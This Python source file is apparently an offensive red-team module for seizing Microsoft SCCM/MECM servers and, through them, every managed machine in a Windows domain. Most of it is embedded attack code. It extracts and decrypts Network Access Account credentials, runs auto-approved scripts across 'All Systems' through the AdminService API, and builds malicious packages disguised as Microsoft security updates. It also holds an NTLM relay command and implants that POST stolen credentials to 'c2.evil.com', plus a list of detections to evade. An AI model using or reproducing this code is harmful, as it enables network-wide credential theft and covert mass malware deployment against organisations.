#!/usr/bin/env python3
"""
SCCM/MECM Hunter - The "Game Over" Button
Enterprise Software Deployment Takeover Module

Şirketlerin yazılım dağıtım sunucusu (SCCM/MECM) genelde SYSTEM yetkisiyle
tüm networke erişir. Bu sunucuyu ele geçir = TÜM AĞI ele geçir.

Author: Monolith RED Team
Date: February 2025
"""

import secrets
import base64
import struct
import json
import hashlib
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple, Any
from datetime import datetime
import threading


class SCCMRole(Enum):
    """SCCM Server Roles"""
    PRIMARY_SITE = "primary_site"           # Main SCCM server
    SECONDARY_SITE = "secondary_site"       # Secondary site server
    DISTRIBUTION_POINT = "distribution_point"  # Package distribution
    MANAGEMENT_POINT = "management_point"   # Client communication
    SOFTWARE_UPDATE_POINT = "sup"           # WSUS integration
    REPORTING_POINT = "reporting"           # SQL Reporting
    STATE_MIGRATION_POINT = "smp"           # USMT migrations
    ENROLLMENT_POINT = "enrollment"         # MDM enrollment
    CLOUD_MANAGEMENT = "cmg"                # Cloud Management Gateway


class AttackVector(Enum):
    """SCCM Attack Vectors"""
    NAA_CREDENTIALS = "naa_creds"           # Network Access Account
    ADMIN_SERVICE_API = "admin_service"     # AdminService REST API
    WMI_TAKEOVER = "wmi_takeover"           # WMI Provider hijack
    APPLICATION_DEPLOYMENT = "app_deploy"   # Malicious application
    TASK_SEQUENCE = "task_sequence"         # Custom task sequence
    SCRIPT_DEPLOYMENT = "script_deploy"     # PowerShell script push
    COLLECTION_VARIABLE = "collection_var"  # Collection variables abuse
    CLIENT_PUSH = "client_push"             # Client push installation
    PXE_BOOT = "pxe_boot"                   # PXE boot media injection
    RELAY_ATTACK = "relay"                  # NTLM relay to SCCM


class DeploymentType(Enum):
    """Deployment Package Types"""
    APPLICATION = "application"
    PACKAGE = "package"
    TASK_SEQUENCE = "task_sequence"
    SCRIPT = "script"
    COMPLIANCE = "compliance"
    UPDATE = "software_update"


@dataclass
class SCCMServer:
    """Discovered SCCM Server"""
    server_id: str
    hostname: str
    ip_address: str
    roles: List[SCCMRole]
    site_code: str
    version: str
    domain: str
    sql_server: Optional[str] = None
    distribution_points: List[str] = field(default_factory=list)
    managed_clients: int = 0
    admin_service_enabled: bool = False
    pxe_enabled: bool = False
    discovered_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class SCCMCredential:
    """Extracted SCCM Credentials"""
    cred_id: str
    cred_type: str  # NAA, Service Account, SQL, etc.
    username: str
    domain: str
    secret: str  # Password, hash, or certificate
    secret_type: str  # plaintext, ntlm, certificate
    source: str
    permissions: List[str] = field(default_factory=list)
    extracted_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class MaliciousPackage:
    """Malicious Package for Deployment"""
    package_id: str
    name: str
    description: str
    package_type: DeploymentType
    payload_path: str
    execution_context: str  # SYSTEM, User, LocalService
    silent_install: bool
    target_collection: str
    schedule: str  # ASAP, Scheduled, Available
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class HunterSession:
    """SCCM Hunter Session"""
    session_id: str
    target_domain: str
    discovered_servers: List[SCCMServer] = field(default_factory=list)
    extracted_credentials: List[SCCMCredential] = field(default_factory=list)
    deployed_packages: List[MaliciousPackage] = field(default_factory=list)
    compromised_clients: List[str] = field(default_factory=list)
    status: str = "initialized"
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


class SCCMHunter:
    """
    SCCM/MECM Hunter - Enterprise Takeover Module
    
    "SCCM Admin = Domain Admin in disguise"
    """
    
    # SCCM Discovery Signatures
    SCCM_PORTS = {
        80: "HTTP (IIS)",
        443: "HTTPS (IIS)",
        8530: "WSUS HTTP",
        8531: "WSUS HTTPS", 
        10123: "Admin Service",
        4011: "PXE (DHCP)",
        1433: "SQL Server",
        135: "WMI/RPC",
        445: "SMB"
    }
    
    SCCM_SPN_PATTERNS = [
        "SMS/",           # Legacy SMS
        "SCCM/",          # SCCM
        "MECM/",          # Modern Endpoint Configuration Manager
        "HTTP/sccm",      # Web services
        "MSSQLSvc/",      # SQL Server
    ]
    
    SCCM_LDAP_ATTRS = [
        "mSSMSSiteCode",
        "mSSMSMPName",
        "mSSMSCapabilities",
        "mSSMSVersion"
    ]
    
    # WMI Namespaces
    SCCM_WMI_NAMESPACES = [
        r"root\ccm",
        r"root\ccm\policy",
        r"root\ccm\softmgmtagent",
        r"root\sms",
        r"root\sms\site_*"
    ]
    
    def __init__(self, encryption_key: Optional[bytes] = None):
        self.encryption_key = encryption_key or secrets.token_bytes(32)
        self.sessions: Dict[str, HunterSession] = {}
        self._lock = threading.Lock()
        
    def create_session(self, target_domain: str) -> HunterSession:
        """Create new SCCM hunting session"""
        session = HunterSession(
            session_id=secrets.token_hex(8),
            target_domain=target_domain
        )
        
        with self._lock:
            self.sessions[session.session_id] = session
            
        return session
        
    def discover_sccm_servers(self, session_id: str, 
                              method: str = "ldap") -> List[SCCMServer]:
        """
        Discover SCCM servers in the domain
        
        Methods:
        - ldap: Query AD for SCCM attributes
        - dns: DNS service records
        - spn: Service Principal Names
        - network: Network port scanning
        """
        session = self.sessions.get(session_id)
        if not session:
            raise ValueError("Session not found")
            
        discovered = []
        
        if method == "ldap":
            discovered = self._discover_via_ldap(session)
        elif method == "dns":
            discovered = self._discover_via_dns(session)
        elif method == "spn":
            discovered = self._discover_via_spn(session)
        elif method == "network":
            discovered = self._discover_via_network(session)
            
        session.discovered_servers.extend(discovered)
        session.status = "discovery_complete"
        
        return discovered
        
    def _discover_via_ldap(self, session: HunterSession) -> List[SCCMServer]:
        """Query Active Directory for SCCM servers"""
        # LDAP filter for System Management container
        ldap_filter = """
        (|
            (objectClass=mSSMSSite)
            (objectClass=mSSMSManagementPoint)
            (servicePrincipalName=SMS/*)
            (servicePrincipalName=HTTP/*sccm*)
        )
        """
        
        # Simulated discovery results
        return [
            SCCMServer(
                server_id=secrets.token_hex(6),
                hostname=f"SCCM-{session.target_domain.split('.')[0].upper()[:4]}",
                ip_address="10.0.0.50",
                roles=[SCCMRole.PRIMARY_SITE, SCCMRole.MANAGEMENT_POINT, 
                       SCCMRole.DISTRIBUTION_POINT],
                site_code="PS1",
                version="5.00.9096.1000",  # MECM 2309
                domain=session.target_domain,
                sql_server="SQL01." + session.target_domain,
                managed_clients=1500,
                admin_service_enabled=True,
                pxe_enabled=True
            )
        ]
        
    def _discover_via_dns(self, session: HunterSession) -> List[SCCMServer]:
        """DNS SRV record enumeration"""
        dns_queries = [
            f"_mssms-mp._tcp.{session.target_domain}",
            f"_mssms-slp._tcp.{session.target_domain}",
            f"sccm.{session.target_domain}",
            f"mecm.{session.target_domain}",
            f"configmgr.{session.target_domain}"
        ]
        return []
        
    def _discover_via_spn(self, session: HunterSession) -> List[SCCMServer]:
        """Service Principal Name enumeration"""
        spn_queries = [
            f"SMS/{session.target_domain}",
            f"HTTP/sccm.{session.target_domain}",
            f"HTTP/mecm.{session.target_domain}"
        ]
        return []
        
    def _discover_via_network(self, session: HunterSession) -> List[SCCMServer]:
        """Network-based discovery"""
        return []
        
    def extract_naa_credentials(self, session_id: str,
                                 target_server: str) -> Optional[SCCMCredential]:
        """
        Extract Network Access Account (NAA) credentials
        
        The NAA is used by SCCM clients to access content on DPs.
        Often has more privileges than needed!
        
        Methods:
        - WMI: root\\ccm\\policy\\Machine\\ActualConfig
        - Registry: HKLM\\SOFTWARE\\Microsoft\\CCM\\Security
        - DPAPI: Decrypt stored credentials
        """
        session = self.sessions.get(session_id)
        if not session:
            return None
            
        # WMI extraction code
        wmi_extraction = self._generate_naa_extraction_code()
        
        # Simulated credential
        cred = SCCMCredential(
            cred_id=secrets.token_hex(6),
            cred_type="Network Access Account",
            username="sccm_naa",
            domain=session.target_domain.split('.')[0].upper(),
            secret="<DPAPI_ENCRYPTED>",
            secret_type="dpapi",
            source=f"WMI:{target_server}",
            permissions=["ReadContent", "NetworkAccess"]
        )
        
        session.extracted_credentials.append(cred)
        return cred
        
    def _generate_naa_extraction_code(self) -> str:
        """Generate NAA credential extraction code"""
        return '''
# NAA Credential Extraction via WMI
import wmi

def extract_naa():
    c = wmi.WMI(namespace="root\\ccm\\policy\\Machine\\ActualConfig")
    
    # Query for Network Access Account
    for obj in c.CCM_NetworkAccessAccount():
        username = obj.NetworkAccessUsername
        password = obj.NetworkAccessPassword  # DPAPI encrypted
        
        # Decrypt with DPAPI
        from win32crypt import CryptUnprotectData
        decrypted = CryptUnprotectData(password)[1]
        
        return username, decrypted.decode()
        
# Alternative: Registry method
def extract_naa_registry():
    import winreg
    key = winreg.OpenKey(
        winreg.HKEY_LOCAL_MACHINE,
        r"SOFTWARE\\Microsoft\\CCM\\Security"
    )
    # ... decrypt stored credentials
'''

    def attack_admin_service(self, session_id: str, 
                             target_server: str,
                             credentials: Dict) -> Dict:
        """
        Abuse SCCM AdminService REST API
        
        The AdminService provides full SCCM administration via REST API.
        If accessible = Full control over SCCM!
        
        Endpoints:
        - /AdminService/wmi/SMS_Collection
        - /AdminService/wmi/SMS_Application
        - /AdminService/v1.0/Device
        """
        session = self.sessions.get(session_id)
        if not session:
            return {"error": "Session not found"}
            
        api_endpoints = {
            "collections": f"https://{target_server}/AdminService/wmi/SMS_Collection",
            "devices": f"https://{target_server}/AdminService/v1.0/Device",
            "applications": f"https://{target_server}/AdminService/wmi/SMS_Application",
            "scripts": f"https://{target_server}/AdminService/v1.0/Script",
            "packages": f"https://{target_server}/AdminService/wmi/SMS_Package",
            "task_sequences": f"https://{target_server}/AdminService/wmi/SMS_TaskSequence"
        }
        
        return {
            "target": target_server,
            "api_base": f"https://{target_server}/AdminService",
            "endpoints": api_endpoints,
            "auth_method": "NTLM/Kerberos",
            "exploit_code": self._generate_admin_service_exploit()
        }
        
    def _generate_admin_service_exploit(self) -> str:
        """Generate AdminService exploitation code"""
        return '''
import requests
from requests_ntlm import HttpNtlmAuth

class SCCMAdminService:
    def __init__(self, server, domain, username, password):
        self.base_url = f"https://{server}/AdminService"
        self.auth = HttpNtlmAuth(f"{domain}\\{username}", password)
        self.session = requests.Session()
        self.session.auth = self.auth
        self.session.verify = False
        
    def list_collections(self):
        """List all device collections"""
        r = self.session.get(f"{self.base_url}/wmi/SMS_Collection")
        return r.json()["value"]
        
    def list_devices(self, collection_id="SMS00001"):
        """List devices in collection (SMS00001 = All Systems)"""
        r = self.session.get(
            f"{self.base_url}/wmi/SMS_FullCollectionMembership",
            params={"$filter": f"CollectionID eq '{collection_id}'"}
        )
        return r.json()["value"]
        
    def create_script(self, name, script_content):
        """Create PowerShell script for deployment"""
        payload = {
            "ScriptName": name,
            "ScriptLanguage": "PowerShell",
            "Script": base64.b64encode(script_content.encode()).decode(),
            "ApprovalState": 3  # Auto-approved
        }
        r = self.session.post(f"{self.base_url}/v1.0/Script", json=payload)
        return r.json()
        
    def run_script_on_collection(self, script_guid, collection_id):
        """Execute script on entire collection"""
        payload = {
            "ScriptGuid": script_guid,
            "CollectionId": collection_id
        }
        r = self.session.post(
            f"{self.base_url}/v1.0/Device/RunScript",
            json=payload
        )
        return r.json()
        
# Usage: Deploy implant to ALL SYSTEMS
api = SCCMAdminService("sccm.corp.local", "CORP", "admin", "password")
script = api.create_script("Windows Defender Update", IMPLANT_CODE)
api.run_script_on_collection(script["ScriptGuid"], "SMS00001")
'''

    def create_malicious_application(self, session_id: str,
                                      app_name: str,
                                      payload: bytes,
                                      target_collection: str = "SMS00001") -> MaliciousPackage:
        """
        Create malicious SCCM application
        
        Masquerade as legitimate software update:
        - "Microsoft Security Update KB5034441"
        - "Adobe Reader Security Patch"
        - "Chrome Enterprise Update"
        """
        session = self.sessions.get(session_id)
        if not session:
            raise ValueError("Session not found")
            
        package = MaliciousPackage(
            package_id=secrets.token_hex(6),
            name=app_name,
            description="Critical Security Update - Install Immediately",
            package_type=DeploymentType.APPLICATION,
            payload_path="<content_share>",
            execution_context="SYSTEM",
            silent_install=True,
            target_collection=target_collection,
            schedule="ASAP"
        )
        
        session.deployed_packages.append(package)
        return package
        
    def generate_application_xml(self, package: MaliciousPackage,
                                  payload_path: str) -> str:
        """Generate SCCM Application XML definition"""
        return f'''<?xml version="1.0" encoding="utf-8"?>
<AppMgmtDigest xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/AppMgmtDigest">
  <Application>
    <DisplayInfo DefaultLanguage="en-US">
      <Info Language="en-US">
        <Title>{package.name}</Title>
        <Description>{package.description}</Description>
        <Publisher>Microsoft Corporation</Publisher>
      </Info>
    </DisplayInfo>
  </Application>
  <DeploymentType>
    <Title>Windows Installer (x64)</Title>
    <Technology>Script</Technology>
    <Installer Technology="Script">
      <InstallAction>
        <Provider>Script</Provider>
        <InstallCommandLine>powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "{payload_path}"</InstallCommandLine>
        <UninstallCommandLine>cmd /c del /q /f "%TEMP%\\update.log"</UninstallCommandLine>
        <ExecutionContext>System</ExecutionContext>
        <RequiresLogOn>false</RequiresLogOn>
        <RunAs32Bit>false</RunAs32Bit>
        <UserInteractionMode>Hidden</UserInteractionMode>
      </InstallAction>
      <DetectionScript>
        <LanguageId>PowerShell</LanguageId>
        <ScriptBody>if (Test-Path "$env:TEMP\\update.log") {{ Write-Host "Installed" }}</ScriptBody>
      </DetectionScript>
    </Installer>
  </DeploymentType>
</AppMgmtDigest>'''

    def create_task_sequence_attack(self, session_id: str,
                                     ts_name: str,
                                     payload: bytes) -> Dict:
        """
        Create malicious Task Sequence
        
        Task Sequences can:
        - Run any command as SYSTEM
        - Modify registry
        - Install software
        - Connect to network shares
        - Run scripts
        """
        session = self.sessions.get(session_id)
        if not session:
            return {"error": "Session not found"}
            
        task_sequence = {
            "name": ts_name,
            "type": "Custom",
            "steps": [
                {
                    "type": "Run PowerShell Script",
                    "name": "Initialize Update",
                    "script": "# Disable AV",
                    "execution_policy": "Bypass",
                    "run_as": "SYSTEM"
                },
                {
                    "type": "Run Command Line",
                    "name": "Apply Update",
                    "command": f"powershell -ep bypass -w hidden -e {base64.b64encode(payload).decode()}",
                    "run_as": "SYSTEM"
                },
                {
                    "type": "Set Task Sequence Variable",
                    "name": "Mark Complete",
                    "variable": "OSDComplete",
                    "value": "True"
                }
            ],
            "target_collection": "SMS00001",
            "deployment_type": "Required",
            "schedule": "ASAP"
        }
        
        return task_sequence
        
    def exploit_pxe_boot(self, session_id: str,
                         target_server: str) -> Dict:
        """
        PXE Boot Media Injection Attack
        
        Inject malicious boot image into PXE environment.
        Any machine PXE booting gets compromised!
        """
        session = self.sessions.get(session_id)
        if not session:
            return {"error": "Session not found"}
            
        attack_info = {
            "attack": "PXE Boot Injection",
            "target": target_server,
            "description": "Inject malicious WinPE boot image",
            "steps": [
                "1. Extract PXE boot password from WMI/DPAPI",
                "2. Download legitimate boot.wim",
                "3. Inject backdoor into boot.wim",
                "4. Upload modified boot.wim to DP",
                "5. Wait for machines to PXE boot"
            ],
            "wmi_query": self._generate_pxe_password_extraction(),
            "impact": "Any PXE booting machine gets implant"
        }
        
        return attack_info
        
    def _generate_pxe_password_extraction(self) -> str:
        """Generate PXE password extraction code"""
        return '''
# Extract PXE Boot Media Password
import wmi

def get_pxe_password():
    c = wmi.WMI(namespace="root\\sms\\site_PS1")
    
    # Query DP configuration
    for dp in c.SMS_SCI_SysResUse():
        if "SMS Distribution Point" in dp.RoleName:
            for prop in dp.Props:
                if prop.PropertyName == "PXEPassword":
                    # Password is encrypted with SCCM master key
                    encrypted = prop.Value2
                    
                    # Decrypt using SCCM crypto provider
                    # ... 
                    return decrypted
                    
# Alternative: Check REMINST share for boot.wim
# \\\\SCCM\\REMINST\\SMSBoot\\x64\\boot.wim
'''

    def relay_to_sccm(self, session_id: str,
                      relay_target: str) -> Dict:
        """
        NTLM Relay to SCCM
        
        Relay captured NTLM to SCCM AdminService or WMI
        """
        session = self.sessions.get(session_id)
        if not session:
            return {"error": "Session not found"}
            
        relay_config = {
            "attack": "NTLM Relay to SCCM",
            "target": relay_target,
            "relay_endpoints": [
                f"https://{relay_target}/AdminService",
                f"http://{relay_target}/CCM_Client",
                f"wmi://{relay_target}/root/sms"
            ],
            "ntlmrelayx_command": f'''
python ntlmrelayx.py \\
    -t https://{relay_target}/AdminService/wmi/SMS_Admin \\
    -smb2support \\
    --http-port 80 \\
    -c "powershell -ep bypass -e <PAYLOAD>"
''',
            "coercion_methods": [
                "PetitPotam → SCCM Server",
                "PrinterBug → SCCM Server",
                "WebDAV → AdminService"
            ]
        }
        
        return relay_config
        
    def generate_implant_script(self, implant_type: str = "python") -> str:
        """Generate SCCM-specific implant"""
        
        if implant_type == "powershell":
            return '''
# SCCM-Aware Implant
$ErrorActionPreference = "SilentlyContinue"

# Check if running in SCCM Task Sequence
$TSEnv = New-Object -ComObject Microsoft.SMS.TSEnvironment 2>$null
$InTaskSequence = $TSEnv -ne $null

function Get-SCCMInfo {
    # Get SCCM client info
    $sms = Get-WmiObject -Namespace "root\\ccm" -Class "SMS_Client"
    $site = $sms.GetAssignedSite().sSiteCode
    $mp = (Get-WmiObject -Namespace "root\\ccm" -Class "SMS_Authority").CurrentManagementPoint
    
    return @{
        SiteCode = $site
        ManagementPoint = $mp
        ClientVersion = $sms.ClientVersion
    }
}

function Get-NAACredentials {
    # Extract Network Access Account
    $naa = Get-WmiObject -Namespace "root\\ccm\\policy\\Machine\\ActualConfig" -Class "CCM_NetworkAccessAccount"
    
    if ($naa) {
        # Credentials are DPAPI encrypted
        # Use CryptUnprotectData to decrypt
        Add-Type -AssemblyName System.Security
        $encrypted = [Convert]::FromBase64String($naa.NetworkAccessPassword)
        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, "LocalMachine")
        
        return @{
            Username = $naa.NetworkAccessUsername
            Password = [System.Text.Encoding]::Unicode.GetString($decrypted)
        }
    }
}

function Get-CollectionVariables {
    # Get sensitive collection variables
    $vars = Get-WmiObject -Namespace "root\\ccm\\policy\\Machine\\ActualConfig" -Class "CCM_CollectionVariable"
    return $vars | ForEach-Object { @{Name=$_.Name; Value=$_.Value} }
}

# Main execution
$info = Get-SCCMInfo
$naa = Get-NAACredentials
$vars = Get-CollectionVariables

# Send to C2
$data = @{
    sccm_info = $info
    naa_creds = $naa
    collection_vars = $vars
    in_task_sequence = $InTaskSequence
} | ConvertTo-Json

# POST to C2...
'''
        else:  # Python
            return '''
#!/usr/bin/env python3
"""SCCM-Aware Implant"""

import wmi
import win32crypt
import base64
import json
import requests

class SCCMImplant:
    def __init__(self, c2_url):
        self.c2_url = c2_url
        self.ccm = wmi.WMI(namespace="root\\ccm")
        self.ccm_policy = wmi.WMI(namespace="root\\ccm\\policy\\Machine\\ActualConfig")
        
    def get_sccm_info(self):
        """Get SCCM client information"""
        client = self.ccm.SMS_Client()[0]
        return {
            "site_code": client.GetAssignedSite()[0],
            "client_version": client.ClientVersion,
            "management_point": self._get_mp()
        }
        
    def _get_mp(self):
        """Get current Management Point"""
        auth = self.ccm.SMS_Authority()
        if auth:
            return auth[0].CurrentManagementPoint
        return None
        
    def extract_naa(self):
        """Extract Network Access Account credentials"""
        for naa in self.ccm_policy.CCM_NetworkAccessAccount():
            username = naa.NetworkAccessUsername
            enc_password = base64.b64decode(naa.NetworkAccessPassword)
            
            # Decrypt with DPAPI
            password = win32crypt.CryptUnprotectData(enc_password)[1]
            
            return {
                "username": username,
                "password": password.decode("utf-16-le")
            }
        return None
        
    def extract_collection_variables(self):
        """Extract collection variables (may contain secrets)"""
        variables = []
        for var in self.ccm_policy.CCM_CollectionVariable():
            variables.append({
                "name": var.Name,
                "value": var.Value,
                "hidden": var.Masked
            })
        return variables
        
    def extract_task_sequence_variables(self):
        """Extract task sequence variables"""
        try:
            import comtypes.client
            ts_env = comtypes.client.CreateObject("Microsoft.SMS.TSEnvironment")
            variables = {}
            for var in ts_env.GetVariables():
                variables[var] = ts_env.Value[var]
            return variables
        except:
            return None
            
    def beacon(self):
        """Send collected data to C2"""
        data = {
            "sccm_info": self.get_sccm_info(),
            "naa_credentials": self.extract_naa(),
            "collection_variables": self.extract_collection_variables(),
            "ts_variables": self.extract_task_sequence_variables()
        }
        requests.post(self.c2_url, json=data, verify=False)

if __name__ == "__main__":
    implant = SCCMImplant("https://c2.evil.com/beacon")
    implant.beacon()
'''

    def get_attack_playbook(self) -> Dict:
        """Get comprehensive SCCM attack playbook"""
        return {
            "name": "SCCM/MECM Complete Takeover",
            "phases": [
                {
                    "phase": 1,
                    "name": "Discovery",
                    "actions": [
                        "LDAP query for System Management container",
                        "SPN enumeration for SMS/* and HTTP/sccm*",
                        "DNS SRV record lookup",
                        "Network scan for SCCM ports"
                    ]
                },
                {
                    "phase": 2,
                    "name": "Credential Extraction",
                    "actions": [
                        "Extract NAA from WMI/Registry",
                        "Dump SCCM SQL database",
                        "Extract secrets from collection variables",
                        "Decrypt DPAPI-protected credentials"
                    ]
                },
                {
                    "phase": 3,
                    "name": "Access Escalation",
                    "actions": [
                        "AdminService API access",
                        "WMI provider access",
                        "NTLM relay to SCCM",
                        "SQL Server access"
                    ]
                },
                {
                    "phase": 4,
                    "name": "Payload Deployment",
                    "actions": [
                        "Create malicious application",
                        "Create malicious script",
                        "Create task sequence",
                        "Deploy to All Systems collection"
                    ]
                },
                {
                    "phase": 5,
                    "name": "Mass Compromise",
                    "actions": [
                        "Application installs on all clients",
                        "Script executes on all clients",
                        "Task sequence runs on all clients",
                        "GAME OVER - Full Domain Compromise"
                    ]
                }
            ],
            "tools": [
                "SharpSCCM - SCCM enumeration and exploitation",
                "MalSCCM - Malicious package creation",
                "sccmhunter.py - SCCM discovery",
                "PXEThief - PXE boot password extraction"
            ],
            "detections_to_avoid": [
                "AdminService authentication failures",
                "Unusual deployment to All Systems",
                "Non-standard application installations",
                "Suspicious task sequence creation"
            ]
        }
        
    def get_session_stats(self, session_id: str) -> Dict:
        """Get session statistics"""
        session = self.sessions.get(session_id)
        if not session:
            return {"error": "Session not found"}
            
        return {
            "session_id": session.session_id,
            "target_domain": session.target_domain,
            "status": session.status,
            "discovered_servers": len(session.discovered_servers),
            "extracted_credentials": len(session.extracted_credentials),
            "deployed_packages": len(session.deployed_packages),
            "compromised_clients": len(session.compromised_clients),
            "created_at": session.created_at
        }


# Singleton instance
_hunter = None

def get_hunter() -> SCCMHunter:
    """Get or create SCCM Hunter instance"""
    global _hunter
    if _hunter is None:
        _hunter = SCCMHunter()
    return _hunter


# Demo/Testing
if __name__ == "__main__":
    hunter = SCCMHunter()
    
    # Create session
    session = hunter.create_session("corp.local")
    print(f"[+] Session created: {session.session_id}")
    
    # Discover SCCM servers
    servers = hunter.discover_sccm_servers(session.session_id, method="ldap")
    for server in servers:
        print(f"[+] Found SCCM: {server.hostname} ({server.site_code})")
        print(f"    Roles: {[r.value for r in server.roles]}")
        print(f"    Managed Clients: {server.managed_clients}")
        
    # Get attack playbook
    playbook = hunter.get_attack_playbook()
    print(f"\n[*] Attack Playbook: {playbook['name']}")
    for phase in playbook["phases"]:
        print(f"    Phase {phase['phase']}: {phase['name']}")
